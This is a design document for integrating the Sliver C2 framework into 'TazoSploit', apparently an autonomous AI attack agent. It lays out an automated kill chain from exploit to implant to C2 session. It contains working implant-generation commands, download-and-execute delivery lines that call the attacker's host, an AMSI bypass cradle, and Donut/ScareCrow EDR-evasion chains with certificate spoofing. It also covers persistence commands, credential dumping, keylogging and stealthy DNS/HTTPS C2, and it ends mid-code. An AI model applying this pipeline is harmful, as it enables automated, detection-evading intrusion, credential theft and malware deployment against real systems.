# Sliver C2 Integration — TazoSploit

> **Goal:** After TazoSploit exploits a vulnerability and gains initial access, automatically generate and deploy a Sliver implant, establish a C2 session, and continue post-exploitation through the Sliver framework — closing the discovery-vs-exploitation gap permanently.

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Current State](#current-state)
3. [Integration Design](#integration-design)
4. [Sliver Server Deployment](#sliver-server-deployment)
5. [Implant Generation Pipeline](#implant-generation-pipeline)
6. [Payload Delivery Workflow](#payload-delivery-workflow)
7. [**Evasion Pipeline (AV/EDR Bypass)**](#evasion-pipeline-avedr-bypass)
8. [C2 Interaction Layer](#c2-interaction-layer)
9. [New Skills](#new-skills)
10. [Phase Gate Changes](#phase-gate-changes)
11. [Kali Container Changes](#kali-container-changes)
12. [Security & Safety Controls](#security--safety-controls)
13. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
14. [Implementation Plan](#implementation-plan)
15. [Testing Strategy](#testing-strategy)

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        TazoSploit + Sliver C2                          │
│                                                                         │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────────────┐  │
│  │  Kali Agent   │───▶│ Sliver Client │───▶│   Sliver Server          │  │
│  │ dynamic_agent │    │  (in Kali)   │    │  (dedicated container    │  │
│  │              │    │              │    │   or host process)       │  │
│  └──────┬───────┘    └──────────────┘    └────────────┬─────────────┘  │
│         │                                              │               │
│         │  1. Exploit vuln                             │               │
│         │  2. Generate implant ◀───────────────────────┤               │
│         │  3. Deliver payload                          │               │
│         │  4. Callback received ──────────────────────▶│               │
│         │  5. Post-exploit via C2 ◀────────────────────┤               │
│         │                                              │               │
│         ▼                                              ▼               │
│  ┌──────────────┐                         ┌──────────────────────┐    │
│  │   Target VM   │◀── implant executes ──▶│  C2 Session/Beacon   │    │
│  │ 192.168.4.125 │                         │  (mTLS/HTTP/DNS/WG)  │    │
│  └──────────────┘                         └──────────────────────┘    │
└─────────────────────────────────────────────────────────────────────────┘
```

### Kill Chain Flow (Post-Integration)

```
RECON ──▶ VULN_SCAN ──▶ EXPLOIT ──▶ IMPLANT ──▶ C2 SESSION ──▶ POST_EXPLOIT
                                       │              │               │
                                  Generate         Callback      hashdump
                                  payload          received      screenshot
                                  deliver          confirmed     pivot
                                  execute                        lateral move
                                                                 privesc
                                                                 exfil
```

---

## Current State

### What We Have

| Component | Status | Details |
|-----------|--------|---------|
| **Sliver Server** | ✅ Installed | `~/tools/sliver/sliver-server` v1.7.1 (2026-02-08) |
| **Sliver Config** | ✅ Configured | `~/.sliver/configs/server.yaml`, daemon port 31337 |
| **Existing Implants** | ✅ Built | `ENGLISH_DIVAN.exe` (session), `Powerpnt.exe`, `QUAINT_SHEARLING.bin` |
| **Kali Metasploit** | ✅ Available | `msfvenom`/`msfconsole` 6.4.112 in Kali containers |
| **Sliver in Kali** | ❌ Not installed | Kali containers don't have Sliver client |
| **Exploitation Skill** | ✅ Exists | `skills/exploitation/` — stops at "proof of access" |
| **Persistence Skill** | ✅ Exists | `skills/persistence/` — documents persistence, doesn't deploy C2 |
| **Lateral Movement** | ✅ Exists | `skills/lateral_movement/` — no C2 tunnel support |
| **C2 Skill** | ❌ Missing | No skill for C2 deployment or interaction |
| **Phase Gate** | ❌ No C2 gate | Exploitation "done" = proof of access, no implant requirement |

### Network Topology

```
Host (macOS) ─── 192.168.4.120 (LAN)
  └── Sliver Server (host process, port 31337)
  └── Docker
       ├── tazosploit-kali-1/2 ─── 172.20.0.x (kali-net) + 172.21.0.x (lab-net)
       │     └── host.docker.internal = 192.168.65.254
       │     └── route to 192.168.4.0/24 via 172.20.0.1
       ├── Lab targets ─── lab-net (172.21.0.x)
       └── Windows VM ─── 192.168.4.125 (bridged, LAN)
```

---

## Integration Design

### Option A: Sliver Server as Docker Container (Recommended)

Run Sliver server as a dedicated container in the TazoSploit stack. Benefits:
- Managed lifecycle with `docker-compose`
- Network isolation (only kali-net + lab-net access)
- Persistent storage via Docker volumes
- No dependency on host process being manually started

```yaml
# docker-compose.yml addition
sliver:
  image: tazosploit-sliver:latest
  build:
    context: ./sliver-server
    dockerfile: Dockerfile
  volumes:
    - sliver-data:/root/.sliver          # Persist implant builds, DB, configs
    - sliver-configs:/root/.sliver-client # Operator configs
    - sliver-output:/opt/sliver/output    # Generated payloads shared with Kali
  networks:
    - kali-net      # So Kali clients can connect via gRPC
    - lab-net       # So implant callbacks can reach the server
  ports:
    - "31337:31337"   # gRPC (multiplayer/operator)
    - "8888:8888"     # mTLS listener (implant callbacks)
    - "443:443"       # HTTPS listener (implant callbacks)
    - "53:53/udp"     # DNS listener (optional)
  environment:
    - SLIVER_DAEMON_MODE=true
  restart: unless-stopped
  healthcheck:
    test: ["CMD", "pgrep", "sliver-server"]
    interval: 30s
    timeout: 5s
    retries: 3
```

**Sliver Server Dockerfile:**

```dockerfile
# sliver-server/Dockerfile
FROM ubuntu:24.04

RUN apt-get update && apt-get install -y \
    curl wget git build-essential mingw-w64 \
    && rm -rf /var/lib/apt/lists/*

# Install Sliver server
RUN curl -sSL https://sliver.sh/install | bash

# Daemon mode config
COPY configs/server.yaml /root/.sliver/configs/server.yaml

# Pre-generate operator config for Kali clients
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 31337 8888 443 53/udp

ENTRYPOINT ["/entrypoint.sh"]
```

**entrypoint.sh:**

```bash
#!/bin/bash
set -e

# Start Sliver in daemon mode
sliver-server daemon &
DAEMON_PID=$!

# Wait for daemon to be ready
sleep 5

# Generate operator config for Kali containers (if not exists)
if [ ! -f /root/.sliver-client/configs/kali-operator.cfg ]; then
    sliver-server operator --name kali-operator --lhost sliver --save /root/.sliver-client/configs/kali-operator.cfg
fi

# Start default mTLS listener (if not already running)
# This is handled by the Kali agent via client commands

wait $DAEMON_PID
```

### Option B: Sliver Server on Host (Current Setup)

Keep using `~/tools/sliver/sliver-server` on the host. Simpler but requires:
- Manual start before jobs
- Kali containers reach host via `host.docker.internal` (192.168.65.254)
- Port forwarding for callbacks from targets on LAN

**Recommendation:** Start with Option B (already working), migrate to Option A for production.

---

## Implant Generation Pipeline

### How TazoSploit Generates Payloads

The agent doesn't manually craft shellcode. It uses Sliver's built-in `generate` command through the Sliver client installed in the Kali container.

### Implant Types

| Type | Use Case | Callback Behavior |
|------|----------|-------------------|
| **Session** | Interactive post-exploit, real-time commands | Persistent TCP connection, instant response |
| **Beacon** | Stealthy long-running access, lab persistence | Periodic check-in (configurable interval), async tasks |

**Default for TazoSploit:** Session mode (interactive) for lab targets. Beacon mode for external/stealth engagements.

### Generation Commands (via Sliver Client in Kali)

```bash
# Windows session implant (mTLS callback to Sliver server)
sliver-client generate --mtls sliver:8888 --os windows --arch amd64 \
  --format exe --save /tmp/payload.exe --name tazosploit-session

# Windows beacon implant (periodic check-in)
sliver-client generate beacon --mtls sliver:8888 --os windows --arch amd64 \
  --format exe --save /tmp/beacon.exe --seconds 30 --jitter 10

# Linux session implant
sliver-client generate --mtls sliver:8888 --os linux --arch amd64 \
  --format elf --save /tmp/payload.elf

# Shellcode (for injection into memory via exploit)
sliver-client generate --mtls sliver:8888 --os windows --arch amd64 \
  --format shellcode --save /tmp/payload.bin

# Shared library (DLL for DLL sideloading/injection)
sliver-client generate --mtls sliver:8888 --os windows --arch amd64 \
  --format shared --save /tmp/payload.dll

# Service executable (for Windows service persistence)
sliver-client generate --mtls sliver:8888 --os windows --arch amd64 \
  --format service --save /tmp/service.exe
```

### Target-Aware Payload Selection

The agent determines the right payload format based on recon data:

```
┌─────────────────────────────┐
│  Target OS/Arch Detection   │
│  (from services.json,       │
│   tech_fingerprint.json)    │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────────────────────────┐
│  Payload Decision Matrix                         │
│                                                   │
│  Windows + RCE exploit    → .exe or shellcode    │
│  Windows + DLL hijack     → .dll (shared)        │
│  Windows + service vuln   → .exe (service fmt)   │
│  Linux + RCE exploit      → .elf                 │
│  Linux + web shell upload → .elf (or .so)        │
│  Memory-only exploit      → shellcode (.bin)     │
│  File upload vuln         → .exe/.elf            │
│  Web app RCE              → shellcode via curl   │
└─────────────────────────────────────────────────┘
```

### Evasion Options (for External Engagements)

Sliver supports several evasion techniques during generation:

```bash
# Obfuscated implant (Garble)
sliver-client generate --mtls sliver:8888 --os windows \
  --format shellcode --evasion

# Custom process name
sliver-client generate --mtls sliver:8888 --os windows \
  --format exe --name svchost --save /tmp/svchost.exe

# Canary domain (detect if implant is shared/analyzed)
sliver-client generate --mtls sliver:8888 --os windows \
  --canary mydomain.com --save /tmp/payload.exe
```

---

## Payload Delivery Workflow

After exploitation gains initial access, the agent delivers the Sliver payload. The delivery method depends on the exploit type:

### Delivery Methods

| Access Type | Delivery Method | Commands |
|-------------|-----------------|----------|
| **RCE (command exec)** | Download + execute via curl/wget/PowerShell | `curl http://<kali>/payload -o /tmp/p && chmod +x /tmp/p && /tmp/p &` |
| **File upload vuln** | Upload implant through the vuln | Upload .exe/.elf via the same upload mechanism |
| **Web shell** | Use web shell to download + execute | Web shell → `wget` → `chmod +x` → execute |
| **SQL injection (stacked)** | `xp_cmdshell` or `COPY TO PROGRAM` | `'; EXEC xp_cmdshell 'powershell IEX(...)';--` |
| **SMB access** | PsExec / smbclient upload | `smbclient //target/C$ -c 'put payload.exe'` then remote exec |
| **WinRM access** | PowerShell remoting | `Invoke-Command -ComputerName target -ScriptBlock { IEX(...) }` |
| **SSH access** | SCP + execute | `scp payload user@target:/tmp/ && ssh user@target '/tmp/payload &'` |
| **Memory-only** | Reflective injection via exploit | Inject shellcode directly (no file on disk) |

### Hosting the Payload (from Kali)

The Kali container hosts the payload for the target to download:

```bash
# Quick HTTP server for payload delivery
cd /tmp && python3 -m http.server 8080 &

# Or use Sliver's built-in staging (stager listener)
# Configured server-side via: staging-listeners --url http://0.0.0.0:8443 --profile default
```

### Delivery Decision Tree

```
                    ┌─────────────────┐
                    │ Exploit succeeds │
                    │ Access type?     │
                    └────────┬────────┘
                             │
              ┌──────────────┼──────────────┐
              ▼              ▼              ▼
        ┌──────────┐  ┌──────────┐  ┌──────────┐
        │ Command   │  │ File     │  │ Memory   │
        │ Execution │  │ Upload   │  │ Only     │
        └─────┬────┘  └─────┬────┘  └─────┬────┘
              │              │              │
              ▼              ▼              ▼
        Download +     Upload .exe/    Inject
        Execute via    .elf through    shellcode
        curl/wget/     vuln upload     via exploit
        PowerShell     mechanism       payload
              │              │              │
              └──────────────┼──────────────┘
                             ▼
                    ┌─────────────────┐
                    │ Wait for C2     │
                    │ callback (30s)  │
                    └────────┬────────┘
                             │
                    ┌────────┴────────┐
                    │  ✅ Session     │
                    │  established    │
                    └─────────────────┘
```

---

## Evasion Pipeline (AV/EDR Bypass)

> **This is the most critical section.** If the implant gets caught by AV/EDR after all the work to exploit and deliver it, the entire engagement fails. The evasion pipeline ensures implants survive on-target long enough to establish persistent C2.

### Threat Model

| Defense Layer | What It Does | How We Bypass |
|---------------|-------------|---------------|
| **Static AV (signatures)** | Scans file bytes on disk against known patterns | Encryption, packing, code signing, unique builds |
| **AMSI** | Scans scripts/assemblies in memory before execution | AMSI patch (null the scan buffer) |
| **ETW** | Logs .NET/PowerShell/syscall events for EDR telemetry | ETW patch (disable provider logging) |
| **EDR Userland Hooks** | Hooks ntdll.dll syscalls (NtAllocateVirtualMemory, etc.) | Unhooking (ScareCrow), direct/indirect syscalls |
| **Kernel Callbacks** | PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks | Process hollowing, DLL sideloading (avoid new process) |
| **Behavioral Analysis** | Detects suspicious patterns (injection, credential access) | Sleep obfuscation, encrypted sleep, call stack spoofing |
| **Network Detection** | TLS inspection, JA3 fingerprinting, domain reputation | Domain fronting, legitimate cert profiles, jitter |

### The Evasion Chain

Every implant goes through this pipeline BEFORE delivery to the target:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        EVASION PIPELINE                                  │
│                                                                          │
│  Step 1          Step 2          Step 3          Step 4          Step 5  │
│  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌───────┐│
│  │ Generate  │──▶│ Convert  │──▶│ Pack /   │──▶│ Pre-     │──▶│Deliver││
│  │ Sliver    │   │ to       │   │ Load     │   │ Flight   │   │  to   ││
│  │ Shellcode │   │ Position │   │ into     │   │ Test     │   │Target ││
│  │ (raw)     │   │ Indep.   │   │ Evasion  │   │ Against  │   │       ││
│  │           │   │ Code     │   │ Loader   │   │ Defender │   │       ││
│  └──────────┘   └──────────┘   └──────────┘   └──────────┘   └───────┘│
│                                                                          │
│  Sliver         Donut            ScareCrow      ThreatCheck    curl /   │
│  --format       (PE → PIC        (EDR bypass    DefenderCheck  upload / │
│  shellcode      shellcode)       + DLL side-    (scan before   inject   │
│                                  loading)       delivery)               │
└─────────────────────────────────────────────────────────────────────────┘
```

### Step 1: Generate Raw Shellcode (Sliver)

Always generate as **shellcode** first, not as an EXE. Shellcode gives maximum flexibility for evasion loaders.

```bash
# Generate Sliver shellcode (raw bytes, no PE wrapper)
sliver-client generate --mtls sliver:8888 --os windows --arch amd64 \
  --format shellcode --save /tmp/implant.bin --evasion

# With Garble obfuscation (randomizes Go symbols)
sliver-client generate --mtls sliver:8888 --os windows --arch amd64 \
  --format shellcode --save /tmp/implant.bin --evasion

# Beacon mode (stealthy, periodic check-in)
sliver-client generate beacon --mtls sliver:8888 --os windows --arch amd64 \
  --format shellcode --save /tmp/beacon.bin --seconds 60 --jitter 30
```

**Why shellcode first:**
- EXE/DLL implants have PE headers → instant signature detection
- Shellcode can be encrypted, packed, injected into memory — never touches disk as-is
- Evasion loaders (ScareCrow, Donut) work best with raw shellcode input

### Step 2: Shellcode Processing (Donut)

[Donut](https://github.com/TheWover/donut) converts PE files into position-independent shellcode AND adds its own evasion layers:

```bash
# Convert Sliver PE to shellcode (if we started with exe/dll)
donut -i /tmp/implant.exe -o /tmp/implant.bin -a 2 -f 1 -e 3

# Options:
#   -a 2    = x64 architecture
#   -f 1    = raw shellcode output
#   -e 3    = random encryption key (Chaskey cipher)
#   -z 2    = aPLib compression (smaller payload)
#   -b 1    = AMSI/WLDP bypass enabled
#   -k 1    = ETW bypass enabled
#   -j "UpdateService" = fake thread name (blends with legit threads)
```

**Donut's built-in evasion:**
- ✅ AMSI bypass (patches AmsiScanBuffer to return clean)
- ✅ WLDP bypass (Windows Lockdown Policy)
- ✅ ETW bypass (patches EtwEventWrite)
- ✅ Chaskey encryption (128-bit, decrypted only in memory)
- ✅ aPLib/LZNT1 compression
- ✅ PE header overwrite (erases after load)

### Step 3: Evasion Loader (ScareCrow)

[ScareCrow](https://github.com/Tylous/ScareCrow) is the primary EDR bypass framework. It wraps shellcode in a DLL that:
1. Side-loads into a legitimate Windows process (not injection)
2. Unhooks EDR's ntdll.dll hooks using fresh copies from disk/KnownDLLs
3. Uses indirect syscalls to avoid userland hooks entirely
4. Optionally code-signs with a valid certificate

```bash
# Basic: Wrap shellcode in evasion DLL loader
ScareCrow -I /tmp/implant.bin -Loader dll -domain microsoft.com

# With code signing (spoofs a real certificate)
ScareCrow -I /tmp/implant.bin -Loader dll -domain microsoft.com -sign

# Control side-load target process
ScareCrow -I /tmp/implant.bin -Loader dll -domain microsoft.com \
  -process "C:\\Windows\\System32\\RuntimeBroker.exe"

# Binary loader (standalone EXE instead of DLL)
ScareCrow -I /tmp/implant.bin -Loader binary -domain microsoft.com

# WScript loader (via .js/.hta delivery)
ScareCrow -I /tmp/implant.bin -Loader wscript -domain microsoft.com
```

**ScareCrow loader types:**

| Loader | Format | Delivery Method | Stealth Level |
|--------|--------|-----------------|---------------|
| `dll` | .dll | DLL sideloading via legitimate process | ⭐⭐⭐⭐⭐ |
| `binary` | .exe | Direct execution or service install | ⭐⭐⭐ |
| `wscript` | .js/.hta | Social engineering / web delivery | ⭐⭐⭐⭐ |
| `control` | .cpl | Control panel extension | ⭐⭐⭐⭐ |
| `excel` | .xll | Excel add-in (requires Excel) | ⭐⭐⭐⭐ |
| `msiexec` | .msi | MSI installer package | ⭐⭐⭐ |

**ScareCrow evasion mechanisms:**
- ✅ EDR unhooking (copies clean ntdll from disk or KnownDLLs)
- ✅ Indirect syscalls (bypasses userland hooks entirely)
- ✅ AES/RC4/XOR encryption of shellcode (decrypted at runtime)
- ✅ Code signing with valid/spoofed certificates
- ✅ No DLLMain (avoids DLL load monitoring)
- ✅ Process-specific side-loading (blends with legitimate processes)
- ✅ ETW patching

### Step 4: Pre-Flight Testing (CRITICAL)

**NEVER deliver a payload without testing it first.** The agent runs detection checks from inside the Kali container BEFORE sending to target.

#### ThreatCheck / DefenderCheck

```bash
# ThreatCheck — identifies exact bytes that trigger Defender
ThreatCheck -f /tmp/payload.dll -e AMSI

# DefenderCheck — similar, tests against Defender signatures
DefenderCheck /tmp/payload.exe

# If flagged: pinpoints the byte offset → re-pack with different encryption/obfuscation
```

#### AntiScan.me / nodistribute.com (OPSEC-safe scanning)

```bash
# Test against multiple AV engines WITHOUT submitting to VirusTotal
# (VirusTotal shares samples with AV vendors — burns your payload)
curl -F "file=@/tmp/payload.dll" https://antiscan.me/api/scan
```

#### Local Defender Test (in Windows VM lab)

```bash
# Stage 1: Copy payload to Defender-enabled VM
# Stage 2: Check if Defender quarantines it
# Stage 3: If clean → proceed. If caught → re-generate with different evasion.

# Via Sliver session on a test VM:
upload /tmp/payload.dll "C:\\Windows\\Temp\\test.dll"
# Wait 10 seconds for real-time scan
execute -o "powershell Get-MpThreatDetection | Select -Last 1"
# If no detection → payload is clean
```

#### Automated Pre-Flight Script

```python
#!/usr/bin/env python3
"""pre_flight_test.py — Test payload against detection before delivery."""

import subprocess
import sys
import time

def test_payload(payload_path: str) -> dict:
    results = {
        "threatcheck": None,
        "defender_scan": None,
        "file_entropy": None,
        "verdict": "UNKNOWN"
    }

    # 1. ThreatCheck (if available)
    try:
        tc = subprocess.run(
            ["ThreatCheck", "-f", payload_path, "-e", "AMSI"],
            capture_output=True, text=True, timeout=60
        )
        if "No threat found" in tc.stdout:
            results["threatcheck"] = "CLEAN"
        else:
            results["threatcheck"] = "DETECTED"
            results["verdict"] = "FAIL"
            return results
    except FileNotFoundError:
        results["threatcheck"] = "SKIPPED"

    # 2. File entropy check (high entropy = suspicious to heuristics)
    import math
    with open(payload_path, "rb") as f:
        data = f.read()
    entropy = -sum(
        (c / len(data)) * math.log2(c / len(data))
        for c in [data.count(bytes([b])) for b in range(256)]
        if c > 0
    )
    results["file_entropy"] = round(entropy, 2)
    if entropy > 7.9:  # Very high entropy = likely flagged
        results["verdict"] = "WARN_HIGH_ENTROPY"

    # 3. If all checks pass
    if results["verdict"] == "UNKNOWN":
        results["verdict"] = "CLEAN"

    return results

if __name__ == "__main__":
    result = test_payload(sys.argv[1])
    print(f"Verdict: {result['verdict']}")
    if result["verdict"] != "CLEAN":
        print("⚠️  Payload may be detected. Re-generate with different evasion.")
        sys.exit(1)
    print("✅ Payload passed pre-flight. Safe to deliver.")
```

### Step 5: Delivery with Evasion

Even the delivery method matters. Downloading a `.exe` via PowerShell is suspicious. Use these instead:

#### Memory-Only Execution (Best — No File on Disk)

```powershell
# PowerShell: Download shellcode + inject into memory (no file on disk)
$bytes = (New-Object Net.WebClient).DownloadData('http://<kali>:8080/payload.bin')
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $mem, $bytes.Length)
# ... invoke via delegate (varies by loader)

# Or: PowerShell cradle with AMSI bypass first
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
IEX(New-Object Net.WebClient).DownloadString('http://<kali>:8080/stager.ps1')
```

#### DLL Sideloading (ScareCrow Output)

```bash
# From Kali: Host the malicious DLL + a legitimate exe that loads it
python3 -m http.server 8080 &

# On target (via RCE):
# 1. Download legitimate exe + malicious DLL to same directory
curl http://<kali>:8080/RuntimeBroker.exe -o C:\Users\Public\RuntimeBroker.exe
curl http://<kali>:8080/version.dll -o C:\Users\Public\version.dll
# 2. Execute the legitimate exe — it auto-loads our DLL
C:\Users\Public\RuntimeBroker.exe
```

#### Process Hollowing (via Custom Loader)

```bash
# Hollow out a legitimate process and inject shellcode
# Loader creates suspended svchost.exe → unmaps original code → writes shellcode → resumes
./hollow_loader.exe /tmp/implant.bin svchost.exe
```

#### Reflective DLL Loading

```bash
# Load DLL entirely in memory without LoadLibrary (avoids kernel callback)
# Sliver supports this natively via execute-assembly and sideload commands
```

### Evasion Decision Matrix

The agent selects the evasion strategy based on the target's defenses:

```
┌──────────────────────────────────────────────────────────────────────┐
│                    EVASION DECISION MATRIX                            │
│                                                                       │
│  Recon reveals:           │  Evasion strategy:                       │
│  ─────────────────────────┼──────────────────────────────────────────│
│  Windows Defender only    │  Sliver --evasion + ScareCrow DLL        │
│  (no EDR)                 │  (usually sufficient)                    │
│                           │                                          │
│  CrowdStrike / S1 /      │  Full chain: Shellcode → Donut (AMSI +   │
│  Cortex / MDE             │  ETW patch) → ScareCrow (unhook +        │
│                           │  indirect syscalls + code sign) →        │
│                           │  DLL sideload delivery                   │
│                           │                                          │
│  Network monitoring       │  HTTPS C2 with domain fronting +         │
│  (TLS inspection, IDS)    │  legitimate cert + high jitter           │
│                           │                                          │
│  No AV/EDR (lab)          │  Raw Sliver implant (skip evasion)       │
│                           │  Faster generation, easier debugging     │
│                           │                                          │
│  Unknown defenses         │  Full chain (assume worst case)          │
│  (default)                │  Pre-flight test → adapt                 │
└──────────────────────────────────────────────────────────────────────┘
```

### Pre-Built "Golden" Implants vs Fresh Generation

| Approach | Pros | Cons | When to Use |
|----------|------|------|-------------|
| **Pre-built golden implants** | Instant deployment, pre-tested, known-clean | Static signature, once burned = useless | Lab environments, time-critical engagements |
| **Fresh per-engagement** | Unique every time, harder to signature | Slower (generation + evasion + test = ~2-5 min) | Real targets, EDR-protected environments |
| **Hybrid (recommended)** | Golden for initial speed, fresh if caught | Slightly more complex logic | Default strategy for TazoSploit |

**Golden implant library structure:**

```
/opt/sliver/golden/
├── windows/
│   ├── x64/
│   │   ├── session_mtls_scarecrow.dll    # ScareCrow-wrapped session
│   │   ├── session_mtls_raw.bin          # Raw shellcode (for custom loaders)
│   │   ├── beacon_https_scarecrow.dll    # ScareCrow-wrapped beacon
│   │   └── stager_http.ps1              # PowerShell stager
│   └── x86/
│       └── ...
├── linux/
│   ├── x64/
│   │   ├── session_mtls.elf
│   │   └── session_mtls_packed.elf       # UPX + strip
│   └── arm64/
│       └── ...
└── shellcode/
    ├── windows_x64_mtls.bin
    ├── windows_x64_https.bin
    └── linux_x64_mtls.bin
```

### Runtime Evasion (Post-Delivery, In-Session)

Once the implant is running, Sliver provides additional evasion:

#### Sleep Obfuscation
```bash
# Beacon sleep with encrypted memory (payload encrypted while sleeping)
# Configured at generation time:
sliver-client generate beacon --mtls sliver:8888 --os windows \
  --format shellcode --seconds 60 --jitter 30

# Sliver 1.6+ supports sleep obfuscation natively
# Beacon encrypts its memory while sleeping, decrypts only during check-in
```

#### Process Migration
```bash
# Move implant to a different process (evade process-based detection)
migrate -p <PID>  # Inject into another process

# Or spawn a new process and migrate
spawn --process-name svchost.exe
```

#### In-Memory .NET Execution
```bash
# Run tools like Rubeus, Seatbelt, SharpHound WITHOUT dropping to disk
execute-assembly /opt/tools/Rubeus.exe kerberoast
execute-assembly /opt/tools/Seatbelt.exe -group=all
execute-assembly /opt/tools/SharpHound.exe -c All

# Sliver's execute-assembly uses its own CLR loader
# Patches AMSI before loading the assembly
```

#### SOCKS Proxy (Network Evasion)
```bash
# Route all post-exploit traffic through the C2 channel
socks5 start -p 1080

# From Kali: Use proxychains to route tools through the C2 tunnel
proxychains nmap -sT 10.0.0.0/24
proxychains crackmapexec smb 10.0.0.0/24
```

### Evasion Tools — Installation in Kali Container

```dockerfile
# Add to kali-executor/Dockerfile

# --- Evasion Toolchain ---

# ScareCrow (EDR bypass loader framework)
RUN apt-get update && apt-get install -y \
    osslsigncode openssl mingw-w64 && \
    go install github.com/Tylous/ScareCrow@latest && \
    mv ~/go/bin/ScareCrow /usr/local/bin/

# Donut (PE → shellcode converter with AMSI/ETW bypass)
RUN git clone https://github.com/TheWover/donut.git /opt/donut && \
    cd /opt/donut && make && \
    cp /opt/donut/donut /usr/local/bin/

# Donut Python module (for programmatic use)
RUN pip3 install donut-shellcode

# ThreatCheck (pre-flight AV testing)
RUN git clone https://github.com/rasta-mouse/ThreatCheck.git /opt/ThreatCheck && \
    cd /opt/ThreatCheck && dotnet build -c Release && \
    ln -s /opt/ThreatCheck/ThreatCheck/bin/Release/net6.0/ThreatCheck /usr/local/bin/ThreatCheck

# Nim-based loaders (alternative to ScareCrow)
RUN curl https://nim-lang.org/choosenim/init.sh -sSf | bash -s -- -y && \
    export PATH=$HOME/.nimble/bin:$PATH && \
    nimble install -y winim

# SharpCollection (pre-compiled offensive .NET tools for execute-assembly)
RUN git clone https://github.com/Flangvik/SharpCollection.git /opt/sharp-collection

# Post-exploit .NET assemblies
RUN mkdir -p /opt/tools && \
    wget -O /opt/tools/Rubeus.exe "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Rubeus.exe" && \
    wget -O /opt/tools/Seatbelt.exe "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Seatbelt.exe" && \
    wget -O /opt/tools/SharpHound.exe "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe" && \
    wget -O /opt/tools/Certify.exe "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Certify.exe"
```

### Transport Evasion (C2 Communication)

The C2 channel itself must be stealthy. Default mTLS is detectable by network monitors.

| Transport | Stealth | Speed | Use Case |
|-----------|---------|-------|----------|
| **mTLS** | ⭐⭐⭐ | Fast | Lab, internal networks |
| **HTTPS** | ⭐⭐⭐⭐ | Fast | External targets (blends with web traffic) |
| **DNS** | ⭐⭐⭐⭐⭐ | Slow | Highly monitored networks (DNS always allowed) |
| **WireGuard** | ⭐⭐⭐⭐ | Fast | Encrypted tunnel (if WG traffic allowed) |
| **Named Pipes** | ⭐⭐⭐⭐⭐ | Fast | Lateral movement (host-to-host, no network) |

```bash
# HTTPS C2 with legitimate-looking profile
sliver-client generate --http sliver.legit-domain.com --os windows \
  --format shellcode --save /tmp/implant.bin

# DNS C2 (exfiltrate through DNS queries — very hard to block)
sliver-client generate --dns sliver.legit-domain.com --os windows \
  --format shellcode --save /tmp/implant.bin

# Named pipe (for pivot/lateral — no network traffic)
sliver-client generate --named-pipe \\.\pipe\msupdate --os windows \
  --format shellcode --save /tmp/implant.bin
```

### HTTPS C2 Hardening

```bash
# Configure HTTPS listener with custom TLS cert + domain
https --domain legit-updates.com --cert /opt/certs/fullchain.pem \
  --key /opt/certs/privkey.pem --lport 443

# Custom C2 profile (mimics legitimate web traffic patterns)
# Sliver supports C2 profiles that shape HTTP requests/responses
# to look like normal web browsing
```

---

## C2 Interaction Layer

Once the implant calls back, the agent interacts with the target through Sliver's C2 commands.

### Session Management

```bash
# List active sessions
sliver-client sessions

# Interact with a session
sliver-client use <SESSION_ID>

# List active beacons
sliver-client beacons

# Interact with a beacon
sliver-client use <BEACON_ID>
```

### Post-Exploitation Command Map

These are the Sliver commands the agent would use, organized by pentest phase:

#### Enumeration (in-session)
```bash
info                    # System info (OS, arch, hostname, user)
whoami                  # Current user + privileges
getuid                  # UID/GID
getpid                  # Current process
ps                      # Process list
netstat                 # Network connections
ifconfig                # Network interfaces
ls / dir                # File listing
cat <file>              # Read files
env                     # Environment variables
registry read           # Windows registry (Windows only)
```

#### Credential Access
```bash
hashdump                # Dump SAM hashes (Windows, requires SYSTEM)
mimikatz                # Kiwi/Mimikatz extension (if loaded)
dumpthread              # Thread token impersonation
procdump -p <PID>       # Dump LSASS for offline credential extraction
```

#### Privilege Escalation
```bash
getprivs                # Check current privileges
getsystem               # Attempt SYSTEM via named pipe impersonation
impersonate             # Token impersonation
execute-assembly <.NET> # Run Seatbelt, SharpUp, etc.
sideload <dll>          # Load .NET assemblies into memory
```

#### Lateral Movement
```bash
pivots                  # List pivots
pivots tcp              # Start TCP pivot listener
portfwd add -r <host>:<port> -b 127.0.0.1:<lport>  # Port forward
ssh -l <user> <host>    # SSH through session
psexec <target> <bin>   # PsExec lateral movement
wmi <target> <cmd>      # WMI execution
```

#### Persistence
```bash
# Deploy additional implant as service
execute -o "sc create svcname binpath= C:\path\to\implant.exe start= auto"

# Scheduled task persistence
execute -o 'schtasks /create /tn "Update" /tr "C:\path\to\beacon.exe" /sc onlogon'

# Registry run key
registry write --hive HKCU --type string \
  --path 'Software\Microsoft\Windows\CurrentVersion\Run' \
  --name Update --value 'C:\path\to\beacon.exe'
```

#### Data Collection & Exfiltration
```bash
download <remote_path>  # Download file from target
upload <local> <remote> # Upload file to target
screenshot              # Take screenshot
keylogger               # Start keylogger (beacon task)
```

### Automating C2 Interaction

The agent doesn't use Sliver interactively. It executes commands via the Sliver client CLI in non-interactive mode:

```bash
# Execute a command on a session (non-interactive)
sliver-client -c "use <SESSION_ID>; whoami; hashdump; screenshot"

# Or via operator script
sliver-client script /opt/tazosploit/scripts/post_exploit.sliver
```

**Better approach — Sliver's gRPC API:**

Sliver exposes a full gRPC API. TazoSploit can interact programmatically via Python:

```python
# Python gRPC client for Sliver (sliver-py)
# pip install sliver-py

import asyncio
from sliver import SliverClientConfig, SliverClient

async def post_exploit(session_id: str):
    config = SliverClientConfig.parse_config_file("/opt/sliver/kali-operator.cfg")
    client = SliverClient(config)
    await client.connect()

